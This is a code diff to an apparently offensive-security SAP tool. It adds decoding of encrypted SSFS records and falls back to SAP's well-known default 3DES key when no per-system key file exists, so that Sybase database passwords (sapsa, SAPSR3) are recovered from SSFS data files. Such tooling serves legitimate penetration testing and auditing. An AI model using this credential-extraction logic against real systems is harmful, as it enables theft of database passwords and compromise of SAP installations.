@@ -334,6 +334,36 @@ def _decode_ssfs_plaintext_value(payload: bytes) -> str:
     return value.decode("ascii", errors="replace")
 
 
+def _decode_ssfs_encrypted_value(payload: bytes) -> str:
+    """Decode a POST-decryption SSFS record payload into its string value.
+
+    Structure verified against decrypted DB_CONNECT/SYB/SADB_PASSWORD from a
+    live NPL 7.5x kernel (issue #26 SSO chain):
+
+        [ 0 ..  7]  8-byte header (session-specific salt-shaped bytes)
+        [ 8 .. 11]  val_len — big-endian uint32
+        [12 .. 31]  20 bytes — HMAC-SHA1 tag over the value
+        [32 .. 32 + val_len]  the actual value (ASCII)
+        [32 + val_len ..]  block padding
+
+    The 20-byte HMAC + 8-byte header prefix is common to every encrypted
+    SSFS value record (RSECTAB entries have a different envelope handled
+    by the existing decrypt_entry chain, so those stay on their own path).
+    """
+    if len(payload) < 12:
+        return ""
+    try:
+        val_len = int.from_bytes(payload[8:12], "big")
+    except Exception:
+        return ""
+    # Sanity: passwords are short (< 256 bytes) and never negative.
+    if val_len <= 0 or val_len > 512:
+        return ""
+    if len(payload) < 32 + val_len:
+        return ""
+    return _decode_ssfs_plaintext_value(payload[32:32 + val_len])
+
+
 def extract_sybase_kernel_creds(dat_file_bytes: bytes,
                                  ssfs_key: bytes = None) -> dict:
     """Extract the Sybase / DEFAULT DB credentials the SAP kernel uses.
@@ -371,7 +401,24 @@ def extract_sybase_kernel_creds(dat_file_bytes: bytes,
     if not dat_file_bytes:
         return result
 
-    records = parse_ssfs_dat(dat_file_bytes, ssfs_key=ssfs_key, with_flags=True)
+    # On systems with no SSFS_<SID>.KEY file on disk (e.g. the NPL Developer
+    # Edition VM) the SAP kernel falls back to a well-known default 3DES key
+    # — the same DEFAULT_KEY_HEX SAPMAP already carries for RSECTAB entry
+    # decryption.  Verified live: this key does decrypt the SSFS record
+    # envelopes when no per-system key file exists, revealing the sapsa /
+    # SAPSR3 credential values.  So when the caller passed no ssfs_key we
+    # opportunistically try DEFAULT_KEY_HEX before giving up.
+    effective_key = ssfs_key
+    key_source = "individual"
+    if effective_key is None:
+        try:
+            effective_key = bytes.fromhex(DEFAULT_KEY_HEX)
+            key_source = "SAP default (no SSFS_<SID>.KEY on disk)"
+        except Exception:
+            effective_key = None
+
+    records = parse_ssfs_dat(dat_file_bytes, ssfs_key=effective_key,
+                              with_flags=True)
 
     def _lookup(target_ident: str):
         for ident, data_hex, is_plaintext in records:
@@ -387,6 +434,8 @@ def extract_sybase_kernel_creds(dat_file_bytes: bytes,
         if payload is not None and is_plain:
             result[key] = _decode_ssfs_plaintext_value(payload)
 
+    any_encrypted_seen = False
+    any_encrypted_decoded = False
     for ident, key in (
             (_SSFS_SYB_SADB_PASSWORD,  "sapsa_password"),
             (_SSFS_DEFAULT_DB_PWD,     "sapsr3_password"),
@@ -398,14 +447,24 @@ def extract_sybase_kernel_creds(dat_file_bytes: bytes,
             # Extraordinarily rare, but honour the flag.
             result[key] = _decode_ssfs_plaintext_value(payload)
             continue
-        # Encrypted: parse_ssfs_dat already decrypted the payload IF
-        # ssfs_key was supplied.  If it wasn't, we're staring at raw
-        # ciphertext — flag the caller.
-        if ssfs_key:
-            # Post-decrypt payload; strip fillers same as plaintext.
-            result[key] = _decode_ssfs_plaintext_value(payload)
-        else:
-            result["encrypted_missing_key"] = True
+        any_encrypted_seen = True
+        # Encrypted: parse_ssfs_dat has already run RSECCipher on the payload
+        # with `effective_key` (individual or default); now peel off the
+        # 8-byte header + 4-byte val_len + 20-byte HMAC prefix to get the
+        # actual value.
+        if effective_key is not None:
+            decoded = _decode_ssfs_encrypted_value(payload)
+            if decoded:
+                result[key] = decoded
+                any_encrypted_decoded = True
+
+    if any_encrypted_seen and not any_encrypted_decoded and ssfs_key is None:
+        # Default-key fallback didn't get us a readable value — flag the
+        # caller so it can log clearly and suggest supplying the per-system
+        # SSFS master key.
+        result["encrypted_missing_key"] = True
+    elif any_encrypted_decoded and key_source != "individual":
+        result["source"] = f"SSFS DB_CONNECT/* ({key_source})"
 
     return result
 
